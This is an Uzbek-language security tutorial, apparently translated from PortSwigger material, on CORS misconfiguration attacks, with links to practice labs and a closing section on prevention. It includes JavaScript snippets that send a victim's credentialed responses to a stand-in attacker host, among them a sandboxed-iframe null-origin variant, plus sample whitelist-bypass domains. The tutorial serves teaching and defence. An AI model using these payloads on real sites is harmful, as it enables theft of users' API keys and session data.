# Cross-origin resource sharing (CORS)

Biz ushbu bo'limda Cross-origin resource sharing (CORS) nima ekanligi, CORSga asoslangan xujumlar nima ekanligi va ularga qarshi qanday kurashish kerak ekanligi haqida gaplashamiz.

## <mark style="color:yellow;">Cross-origin resource sharing (CORS) nima ?</mark> <a href="#cross-origin-resource-sharing-cors-nima" id="cross-origin-resource-sharing-cors-nima"></a>

Cross-origin resource sharing (CORS) bu bu tashqaridagi domenda joylashgan resurslarga ruxsat olish imkonini beruvchi brauzerning mexanizmi. CORS Same Origin Policy ([<mark style="color:yellow;">SOP</mark>](same-orign-policy.md)) ga qo'shiladi va uning moslashuvchanligini yaxshilaydi. Ammo u cross-domain xujumlarini tashkil etishga sabab bo'lishi mumkin, agarda web saytning CORS sozlamalari yaxshi sozlanmagan bo'lsa. CORS hech qachon cross-site xujumlarni to'sish uchun xizmat qilmaydi misol uchun [<mark style="color:yellow;">CSRF</mark>](broken-reference) ni sodir bo'lishini oldini olmaydi.

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
<mark style="color:yellow;">**Labratoriyalar:**</mark>

Agar siz CORS haqida tushuncha ega bo'lsangiz va bu zaiflik ustida real labaratoriyalarda mashq qilmoqchi bo'lsangiz, ushbu mavzudagi barcha laboratoriyalarga quyidagi havola orqali kirishingiz mumkin.

<mark style="color:yellow;"></mark>[<mark style="color:yellow;">Barcha CORS labaratoriyalarini ko'ring ≫</mark>](https://portswigger.net/web-security/all-labs#cross-origin-resource-sharing-cors)<mark style="color:yellow;"></mark>
{% endhint %}

## <mark style="color:yellow;">Same origin policy</mark> <a href="#same-origin-policy" id="same-origin-policy"></a>

Same origin policy bu web saytning cross-origin spetsifikatsiyasiga limit qo'yib tashqaridagi domendan keluvchi resurslarni cheklash. Same origin policy bundan bir necha yillar ilgari cross-domain interaktsiyasida zararli deb topilgan, sababi boshqa web sayt aynan same origin policy ni ishlatgan holda boshqa web saytning maxfiy ma'lumotlarini qo'lga kiritgan edi. O'zi same origin policy asosan saytlararo request larni jo'natishda xatolarni keltirib chiqaradi, ammo responselarga kirish imkonini bermasligi mumkin.

{% hint style="info" %}
**Ko'proq o'qish:**

[Same-origin policy ☰](same-orign-policy.md)
{% endhint %}

## <mark style="color:yellow;">Same origin policyni chetlab o'tish</mark> <a href="#same-origin-policy-yengilligi" id="same-origin-policy-yengilligi"></a>

Same origin policy juda cheklangan va shuning uchun cheklovlarni chetlab o'tish uchun turli usullar ishlab chiqilgan. Ko'pgina veb-saytlar subdomenlar yoki uchinchi tomon saytlari bilan to'liq cross-orignni talab qiladigan tarzda tasir ko'rsatadi. Yaxshi nazoratga olingan same origin policy CORS dan foydalanish imkonini beradi.

CORS protokoli yaxshi ishlangan HTTP headerlardan foydalanadi va faqatgina kirish huquqi bo'lgan resurslarga ruxsat beradi. Bular brauzer va u kirishga harakat qilayotgan cross-orign web-sayt oʻrtasida Header almashinuvida birlashtirilgan.

{% hint style="info" %}
**Ko'proq o'qish:**

[CORS va Access-Control-Orign-Allow response headerlari ☰](access-control-allow-origin.md)
{% endhint %}

## <mark style="color:yellow;">CORS konfiguratsiyasidagi muammolar sabab qanday qilib zaifliklar hosil bo'ladi ?</mark> <a href="#cors-konfiguratsiyasidagi-muammolar-sabab-qanday-qilib-zaifliklar-hosil-boladi" id="cors-konfiguratsiyasidagi-muammolar-sabab-qanday-qilib-zaifliklar-hosil-boladi"></a>

Juda ko'plab zamonaviy web saytlar subdomen va 3-tomon saytlaridan foydalanadi. Bulardan foydalanish ba'zida CORS muammolarini paydo qiladi yoki har qanday narsa ishlashiga yordam berishi mumkin va natijada bu exploit qilish mumkin bo'lgan zaifliklarni keltirib chiqaradi.

## <mark style="color:yellow;">Client-specified-Origin headeridan server-generated</mark> [<mark style="color:yellow;">ACAO</mark>](access-control-allow-origin.md) <mark style="color:yellow;">headeri</mark> <a href="#server-tomonidan-yaratilgan-acao-header-idan-client-specified-origin-header-i-kelib-chiqishi" id="server-tomonidan-yaratilgan-acao-header-idan-client-specified-origin-header-i-kelib-chiqishi"></a>

Ba'zi websaytlar bir qator boshqa domenlarga kirishni ta'minlashi kerak. Ruxsat etilgan domenlar ro'yxatini saqlash doimiy harakatni talab qiladi va har qanday xatolik funksionallikni buzish xavfini tug'diradi. Shunday ekan ba'zi web saytlarda boshqa domenga ruxsat olish osonlikcha amalga oshirilishi mumkin.

Buning usullaridan biri soʻrovlardan `Origin` headerini oʻqish va soʻrovning kelib chiqishiga ruxsat berilganligini bildiruvchi javob headerini kiritishdir. Masalan, quyidagi websayt so'roviga qarang :

```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

va u mana bunday javob qaytaradi:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

Bu headerlardan shuni bilish mumkinki, [https://malicious-website.com](https://malicious-website.com) web saytga ruxsat olingan va cross-origin so'rovlarda cookie saqlanadi (`Access-Control-Allow-Credentials: true`) va u faqat ushbu sessiyada ishlashini ta'minlaydi.

Chunki web sayt o'zboshimchalik bilan domenlarga `Access-Control-Allow-Origin`ni header ga qo'shib jo'natmoqda, bu esa har qanday domen orqali zaif web saytning resurslariga kirish mumkin. Agar responseda har qanday API key yoki CSRF token bo'lsa siz uni skript yozib olishingiz mumkin. Masalan:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//malicious-website.com/log?key='+this.responseText;
};
```

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Boshlang'ich orign reflection bilan CORS zaifligi ≫](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
{% endhint %}

## <mark style="color:yellow;">Origin headerlarni tahlil qilinishidagi xatolar</mark> <a href="#origin-header-larni-tahlil-qilinishidagi-xatolar" id="origin-header-larni-tahlil-qilinishidagi-xatolar"></a>

Ba'zi web saytlarda ko'plab originlardan foydalanadi va ular whitelistda saqlanadi. Qachonki CORS request kelsa, u white listdagi domen bilan solishtirib ko'radi. Agar origin white listda bo'lsa responseda `Access-Control-Allow-Origin` headerini qo'shib jo'natadi. Misol uchun, web sayt mana bunday request qabul qildi:

```http
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```

Web sayt uni white listda bor yoki yo'qligini tekshiradi agarda u white listda bo'lsa unda mana bunday response qaytaradi:

```http
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```

Xatoliklar ko'pincha CORS ni white listini amalga oshirilayotganda sodir bo'ladi. Ba'zi korxonalar o'zlarining har qanday sub domenlaridan foydalanashni xohlashadi (hattoki hali ishlatishmaydigan subdomenalrini ham kelajakda ishlatishni rejalashtirilganlarini ham) va ba'zi web saytlar har xil korxonalarni subdomenlaridan foydalanishi mumkin. White list bilan bog'lash ko'pincha prefiks yoki suffikslar ishlatilgan holda, yoki Regular Expression ishlatilgan holda amalga oshiriladi. Har qanday xato nomalum tashqi domenga resurslarga kirish imkonini berishi mumkin.

Misol uchun, web sayt quyidagi domen kabi tugagan har qanday domenga ruxsat beradi:

```http
normal-website.com
```

Haker esa ruxsat olish uchun mana bunday qilib jo'natishi mumkin:

```
hakernormal-website.com
```

yoki web sayt, har qanday domen nomi mana shunday boshlansa kirish imkonini berishi mumkin:

```
normal-website.com
```

Haker esa unga mana bunday o'zgartirish kiritib jo'natishi mumkin:

```
normal-website.com.evil-user.net
```

## <mark style="color:yellow;">White listga kiritilgan null origin qiymati</mark> <a href="#oq-royhatga-kirgan-null-qiymatli-origin-lar" id="oq-royhatga-kirgan-null-qiymatli-origin-lar"></a>

Origin Header spesifikatsiyasi null qiymatlarini ham qabul qiladi. Brauzerlar null qiymatini Origin headeriga har xil noodatiy vaziyatlarda kiritib jo'natishi mumkin:

* Cross-origin ni qayta yo'naltirishda.
* Ketma-ketlashtirilgan ma'lumotlardan so'rovlarda.
* file: protokoli asosidagi request da

Ba'zi web saytlar lokal holatdagi web saytning versiyasidan foydalanish maqsadida null qiymatini ishlatishi mumkin. Misol uchun web sayt mana bunday cross-origin request ni qabul qilgan bo'lsa:

```http
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

server mana bunday javob qaytardi:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

Ushbu holatda Haker har xil xiylalarni o'ylab topib null qiymatini Origin headerga qo'shgan holda so'rovlarni yasashi mumkin. Bu esa white listga kirishiga va cross-domain request larni amalga oshirishga sabab bo'ladi. Misol uchun bu quyida keltirilgan iframe li so'rovda ko'rilishi mumkin:

```html
<script>
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Ishonchli null orign bilan CORS zaifligi ≫](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
{% endhint %}

## <mark style="color:yellow;">CORS ishonch aloqalari orqali</mark> [<mark style="color:yellow;">XSS hujumini</mark>](../xss/xss-zaifliklarini-exploit-qilish.md) <mark style="color:yellow;">qilish</mark> <a href="#cors-ishonilgan-munosabatlar-orqali-xss-ni-exploit-qilish" id="cors-ishonilgan-munosabatlar-orqali-xss-ni-exploit-qilish"></a>

Hatto "to'g'ri" sozlangan CORS ikkita manba o'rtasida ishonch aloqalarini  o'rnatadki. Agar web sayt XSS ga zaif bo'lgan manbaga ishonsa, unda Haker CORSni ishga solgan holda JavaScript ineksiya hamda XSS xujumlarini amalga oshirishi mumkin.

Quyidagi requestga e'tibor bering:

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

Agar server quyidagidek response qaytarsa:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Haker unda XSS zaifligini ishga solgan holda subdomain.vulnerable-website.com orqali XSS xujumini qila oladi va  quyidagi URLni ishlatgan holda API keyni olishi mumkin:

```url
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

## <mark style="color:yellow;">TLSni noto'g'ri konfiguratsiya qilingan CORS orqali buzish</mark> <a href="#tls-ni-notogri-konfiguratsiya-qilingan-cors-orqali-aylanib-otish" id="tls-ni-notogri-konfiguratsiya-qilingan-cors-orqali-aylanib-otish"></a>

Tasavvur qiling web sayt qat'iy HTTPS dan foydalanadi va white listdagi domenlarni HTTPdan qabul qiladi. Masalan, agar web sayt quyidagi requestni qabul qilsa:

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

Response mana bunday bo'ladi:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Bunday vaziyatda foydalanuvchini trafigini ushlab turish imkoniyatiga ega bo'lgan Haker foydalanuvchining web sayt bilan o'zaro aloqasini buzish uchun CORS konfiguratsiyasidan foydalanishi mumkin. Bu xujum 3 ta qismdan iborat:

* Foydalanuvchi har qanday HTTP request larni yaratishi mumkin
* Haker quyidagiga yo'naltirishi mumkin:

```url
http://trusted-subdomain.vulnerable-website.com
```

* Foydalanuvchining brauzeri ushbu yo'naltirish ortidan ketadi
* Haker oddiy HTTP so'rovini ushlaydi va CORS so'rovini o'z ichiga olgan soxta javobni qaytaradi:

```url
https://vulnerable-website.com
```

* Foydalanuvchining brauzeri Origin qo'shilgan CORS so'rovini jo'natadi:

```url
http://trusted-subdomain.vulnerable-website.com
```

* Web sayt bunga ruxsat beradi chunki u white listdagi sayt va so'ralgan maxfiy ma'lumotlar responseda namoyon bo'ladi
* Haker sahifani soxtalashtirib maxfiy ma'lumotlarni o'qiydi va o'sha ma'lumotlarni haker qo'lida turgan har qanday domenga jo'nata oladi.

Ushbu xujum qachonki zaif web sayt mustahkam ravishda HTTP endpoint va xavfsiz cookie lar bilan HTTPS dan foydalansa samarali ish beradi.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Ishonilgan havfli protocollar orqali CORS zaifligi ≫](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
{% endhint %}

{% hint style="info" %}
**Ko'proq o'qish:**

[Cross site scripting ☰](broken-reference)
{% endhint %}

## <mark style="color:yellow;">Hisob ma'lumotlarisiz intranetlar va CORS</mark> <a href="#hisob-malumotlarisiz-intranet-va-cors" id="hisob-malumotlarisiz-intranet-va-cors"></a>

Deyarli hamma CORS xujumlari quyidagi header sabab yuzaga keladi:

```http
Access-Control-Allow-Credentials: true
```

Ushbu sarlavhasiz foydalanuvchining brauzeri cookielarini yuborishdan bosh tortadi, ya'ni hacker faqat autentifikatsiya qilinmagan kontentga kirish huquqiga ega bo'ladi, ular to'g'ridan-to'g'ri osongina veb-saytga kirishlari mumkin.

Ammo haker web-saytga to'g'ridan-to'g'ri kira olmaydigan bitta umumiy holat mavjud: sayt tashkilot intranetining bir qismi bo'lsa va shaxsiy IP manzilda joylashgan bo'lsa hacker kira olmaydi. Internal web saytlar externallarga qaraganda past darajadagi xavfsizlik tizimlaridan foydalanadi va bu hakerlarga zaifliklarni topish va qo'shimcha kirish imkoniyatini beradi. Masalan quyidagi CORS requestiga qarang:

```http
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```

va server mana bunday javob qaytaradi:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

Bu web saytni har qanday Origin dan hech qanday hisob ma'lumotlarisiz resurslarni almashishini bildiradi. Agar shaxsiy IP manzil maydonidagi foydalanuvchilar umumiy internetga ulanib kirsalar, intranet resurslariga kirish uchun foydalanuvchining brauzeridan proksi-server sifatida foydalanadigan tashqi saytdan CORS-ga asoslangan hujum amalga oshirilishi mumkin.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Ichki tarmoq hujumi bilan CORS zaifligi ≫](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)
{% endhint %}

## <mark style="color:yellow;">CORSga asoslangan zaifliklarni qanday oldini olish mumkin ?</mark> <a href="#cors-ga-asoslangan-zaifliklarni-qanday-oldini-olish-mumkin" id="cors-ga-asoslangan-zaifliklarni-qanday-oldini-olish-mumkin"></a>

CORS zaifliklari noto'g'ri konfiguratsiya qilish natijasida hosil bo'ladi. Oldini olishning usuli bu to'g'ri konfiguratsiya qilishdir. Quyida keltiradigan usullarimiz sizga CORS xujumlarini oldini olishga yordam beradi.

### <mark style="color:yellow;">CORS ni to'g'ri konfiguratsiya qilish</mark> <a href="#cors-ni-togri-konfiguratsiya-qilish" id="cors-ni-togri-konfiguratsiya-qilish"></a>

Agar web saytda maxfiy ma'lumotlar saqlansa, unda responsedagi origin qismida `Access-Control-Allow-Origin` headeri to'g'ri spesifikatsiya qilingan bo'lishi kerak

### <mark style="color:yellow;">Faqat ishonchli saytlarga ruxsat etish</mark> <a href="#faqat-ishonchli-saytlarga-ruxsat-etish" id="faqat-ishonchli-saytlarga-ruxsat-etish"></a>

Bu ko'rinishidan aniqqa o'xshaydi ammo originlarni hammasining `Access-Control-Allow-Origin` headeri faqatgina ishonchli saytlar uchun ishlashi kerak. Ayniqsa dinamik tarzda originlarni o'zgarishi va cross-origin requestlarni tekshirmasdan qabul qilishiga va exploit qilish imkoni hosil bo'lishiga olib keladi.

### <mark style="color:yellow;">null white listini yaratmaslik</mark> <a href="#null-oq-royhatini-yaratishdan-qochish" id="null-oq-royhatini-yaratishdan-qochish"></a>

`Access-Control-Allow-Origin: null` headeridan foydalanmang. Ichki hujjatlardan cross-orign so'rovlari va sandbox soʻrovlari null manbani koʻrsatishi mumkin. CORS sarlavhalari shaxsiy va ommaviy serverlar uchun ishonchli manbalarga nisbatan to'g'ri aniqlanishi kerak.

### <mark style="color:yellow;">Wildcardlarni</mark> internal tarmoqlarda ishlatmang <a href="#wildcard-larni-internal-tarmoqlarda-ishlatishdan-qoching" id="wildcard-larni-internal-tarmoqlarda-ishlatishdan-qoching"></a>

Wildcardlarni internal tarmoqlarda ishlatmang. Internal brauzerlar ishonchsiz tashqi domenlarga kira olsa, ichki resurslarni himoya qilish uchun faqat tarmoq konfiguratsiyasiga ishonishning o'zi yetarli emas.

### <mark style="color:yellow;">CORS</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">**server-side security policy**</mark><mark style="color:yellow;">ga javob bermaydi</mark> <a href="#cors-server-side-security-policy-ga-javob-bermaydi" id="cors-server-side-security-policy-ga-javob-bermaydi"></a>

CORS, brauzer xatti-harakatlarini belgilaydi va hech qachon maxfiy ma'lumotlarni server tomonida himoya qilishni ta'minlamaydi - Haker har qanday ishonchli manbadan so'rovni to'g'ridan-to'g'ri soxtalashtirishi mumkin. Shu sababli, web-serverlar to'g'ri sozlangan CORS-dan tashqari, autentifikatsiya va seansni boshqarish kabi nozik ma'lumotlarga nisbatan himoyani qo'llashda davom etishlari kerak.

{% hint style="info" %}
**Ko'proq o'qish:**

[Burp Suite skaneri yordamida CORS zaifliklarini aniqlash ☰](https://portswigger.net/burp/vulnerability-scanner)
{% endhint %}
